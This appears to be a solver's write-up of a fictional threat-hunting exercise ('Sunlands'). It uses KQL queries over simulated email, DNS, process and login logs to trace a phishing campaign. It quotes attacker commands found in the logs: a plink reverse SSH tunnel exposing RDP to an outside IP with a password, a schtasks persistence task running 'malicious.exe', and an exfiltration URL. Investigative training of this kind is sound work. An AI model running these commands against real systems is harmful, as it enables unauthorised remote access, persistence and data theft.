// Sunlands

// Section 1: Black Hole
// Q1 - You notice some security alerts for a file that appears to contain details on the blueprints of the Sunlands' energy grid. Paste the filename.
SecurityAlerts
| where description has "blueprints"
// [{'hostname': 'NKIG-DESKTOP', 'sha256': '-'}]
// EnergyGrid-Blueprints.docx

// Q2 - Which host did the alert from Q1 detect the suspicious file on?
// Prev Query
// NKIG-DESKTOP

// Q3 - Which employee does the host from Q2 belong to?
Employees
| where hostname == "NKIG-DESKTOP"
// Monica Aguila - 10.10.3.181 - monica_aguila@space.gov.su - moaguila - Intern

// Q4 - The attacker sent the suspicious file to that employee from what email address?
Email
| where recipient == "monica_aguila@space.gov.su"
| where link contains "EnergyGrid-Blueprints.docx"
// urgent@verizon.com - repl_to: energygrid@protonmail.com

// Q5 - Look at the email message from Q4. The webmail service of the other attacker email address is headquartered in what country?
// Switzerland

// Q6 - What domain did the victim download the file from?
// Prev Query
// renewablesolutionsgriddefender.com

// Q7 - What is the name of the process through which the suspicious file was downloaded?
FileCreationEvents
| where hostname =="NKIG-DESKTOP"
// edge.exe

// Q8 - How many unique IP addresses does the domain from Q6 resolve to?
PassiveDns
| where domain == "renewablesolutionsgriddefender.com"
| distinct ip
| count

// Q9 - How many domains do the IP addresses from Q8 resolve to?
let mal_ips = 
PassiveDns
| where domain == "renewablesolutionsgriddefender.com"
| distinct ip;
PassiveDns
| where ip in (mal_ips)
| distinct domain
| count

// Q10 - How many employees visited the domains from Q9?
let mal_ips = 
PassiveDns
| where domain == "renewablesolutionsgriddefender.com"
| distinct ip;
let mal_domains =
PassiveDns
| where ip in (mal_ips)
| distinct domain;
OutboundNetworkEvents
| where url has_any (mal_domains)
| distinct src_ip
| count

// Q11 - How many unique files were downloaded from the domains from Q9?
let mal_ips = 
PassiveDns
| where domain == "renewablesolutionsgriddefender.com"
| distinct ip;
let mal_domains =
PassiveDns
| where ip in (mal_ips)
| distinct domain;
Email
| where link has_any (mal_domains)
| extend filename = extract(@"[^/]+$", 0, link)
| distinct filename

// Q12 - Looking at the files found in Q11, which one was downloaded the most?
let mal_ips = 
PassiveDns
| where domain == "renewablesolutionsgriddefender.com"
| distinct ip;
let mal_domains =
PassiveDns
| where ip in (mal_ips)
| distinct domain;
let mal_filename =
Email
| where link has_any (mal_domains)
| extend filename = extract(@"[^/]+$", 0, link)
| distinct filename;
FileCreationEvents
| where filename in (mal_filename)
| summarize count()by filename

// Q13 - Let's take a look at the employees who downloaded the files from question 11. Which role is seen the most?
let mal_ips = 
PassiveDns
| where domain == "renewablesolutionsgriddefender.com"
| distinct ip;
let mal_domains =
PassiveDns
| where ip in (mal_ips)
| distinct domain;
let mal_filename =
Email
| where link has_any (mal_domains)
| extend filename = extract(@"[^/]+$", 0, link)
| distinct filename;
let victims  =
FileCreationEvents
| where filename in (mal_filename)
| distinct hostname;
Employees
| where hostname has_any (victims)
| summarize count()by role

// Q14 - What is the name of the employee who first downloaded one of the files from question 11?
let mal_ips = 
PassiveDns
| where domain == "renewablesolutionsgriddefender.com"
| distinct ip;
let mal_domains =
PassiveDns
| where ip in (mal_ips)
| distinct domain;
let mal_filename =
Email
| where link has_any (mal_domains)
| extend filename = extract(@"[^/]+$", 0, link)
| distinct filename;
let first_victim =
FileCreationEvents
| where filename in (mal_filename)
| order by timestamp asc 
| take 1
| distinct username;
Employees
| where username in (first_victim)
| distinct name


// Q14
// original: TDMtRDlOeDFYczg9aT91cGduai96YnAucm9oZ2hibC5qamovLzpmY2dndQ==
// base64: L3-D9Nx1Xs8=i?upgnj/zbp.rohghbl.jjj//:fcggu
// Looks like some sort of url
// Shifted in the 13th: Y3-Q9Ak1Kf8=v?hctaw/moc.ebutuoy.www//:sptth
// reverse: https://www.youtube.com/watch?v=8fK1kA9Q-3Y

// Section 2: Yeeted into space
// Q1 - What is the domain the attackers used to compromise SASA employees interested in the International Space Summit?
OutboundNetworkEvents
| where url has "summit"
| extend domain = extract(@"https?://([a-zA-Z0-9.-]+)", 1, url)
| distinct domain
| summarize count()by domain
// intlspacesummit2123.info

// Q2 - Which top-level domain (TLD) used by the attacker suggests evidence of foreign interference?
OutboundNetworkEvents
| where url contains "summit" or url contains "international" or url contains "space"
| extend domain = extract(@"https?://(?:www\.)?([^/]+)", 1, url)  
| extend tld = extract(@"\.([a-zA-Z]+)$", 1, domain)
| summarize count() by tld
// .lu

// Extra look
OutboundNetworkEvents
| where url contains "summit" or url contains "international" or url contains "space"
| where url contains ".lu"
| extend domain = extract(@"https?://([a-zA-Z0-9.-]+)", 1, url)
| distinct domain
| summarize count()by domain

// Q3 - What was the most common file (name) that victims downloaded from the attacker domains in Q2?
let potential_filenames=
OutboundNetworkEvents
| where url contains "summit" or url contains "international" or url contains "space"
| extend filename = extract(@"([^\/]+)$", 1, url)
| distinct filename;
FileCreationEvents
| where filename in (potential_filenames)
| summarize count()by filename
// Note: magic number between 15-16

// Q4 - Right after the victims downloaded the files from Q3, the attackers ran a command to connect to their infrastructure. What is the password?
FileCreationEvents
| where filename == "AsteroidMiningBrief.ppt"
// ZKV8-MACHINE - 2123-07-02T15:00:04Z

ProcessEvents
| where hostname == "ZKV8-MACHINE"
// Looked at someoen who donaloaded the top file from before and looked at the process comandline around the same time frame.Something stuck out.
// "powershell.exe" /c echo y | plink.exe -N -T -R 0.0.0.0:1251:127.0.0.1:3389 166.127.104.95 -P 22 -l forward -pw Aliens!:D -no-antispoof

// Q5 - The attackers ran commands to discover more about their victims’ network. What is the hostname of the first victim with these commands? This includes compromised hosts that may have been impacted outside of the file in Q3. 
ProcessEvents
| where process_commandline has "echo y | plink.exe -N -T -R"
// CLWS-MACHINE - 2123-07-01T15:47:50Z

ProcessEvents
| where hostname == "CLWS-MACHINE"
| where process_commandline contains "stat"
// ipconfig /all

ProcessEvents
| where process_commandline contains "nbtstat"
// OWQK-MACHINE - 2123-07-01T15:00:26Z

// Q6 - When did the attackers first run a command to maintain their foothold in victim devices despite restarts, changed credentials, and other interruptions?
ProcessEvents
| where hostname == "OWQK-MACHINE"
// schtasks /create /sc onstart /RU "SYSTEM" /tn "Updater" /tr "C:\Windows\System32\malicious.exe" - 2123-07-19T14:43:53Z

ProcessEvents
| where process_commandline contains "schtasks"
// 2123-07-19T12:00:03Z

// Q7 - We know that some of the Sunlands bigwigs got compromised by our threat actor, the question is how…find the role that was compromised most frequently with the command from question 6. How many hosts linked to this role were compromised?
let hostnames =
ProcessEvents
| where process_commandline contains "schtasks"
| distinct hostname;
Employees
| where hostname in (hostnames)
| summarize count()by role

// Q8 - One of these compromised hosts was used as a vector to target an OP account with full control of the domain. Which account was successfully compromised?
let hostnames =
ProcessEvents
| where process_commandline contains "schtasks"
| distinct hostname;
ProcessEvents
| where hostname in (hostnames)
| summarize count()by hostname, process_commandline

let hostnames =
ProcessEvents
| where process_commandline contains "schtasks"
| distinct hostname;
let ext_ips =
AuthenticationEvents
| where hostname in (hostnames)
| where result == "Successful Login"
| summarize count()by hostname, src_ip,username
| distinct src_ip;
let ext =
ext_ips
| where src_ip !in (Employees | distinct ip_addr);
AuthenticationEvents
| where src_ip in (ext)
| where result == "Successful Login"
| summarize count()by hostname, src_ip,username

Employees
| where role contains "Operation"

ProcessEvents
| where process_commandline contains "auth"
| distinct process_commandline

// Q12 -  The attackers transferred the exfiltrated data to what URL?
ProcessEvents
| where process_commandline contains "bypass"
| distinct process_commandline

ProcessEvents
| where process_commandline contains "bypass -enc JigmKCAkc0h"
// QT2K-LAPTOP, MEMM-DESKTOP
// http://spaceresearch.as/exfil/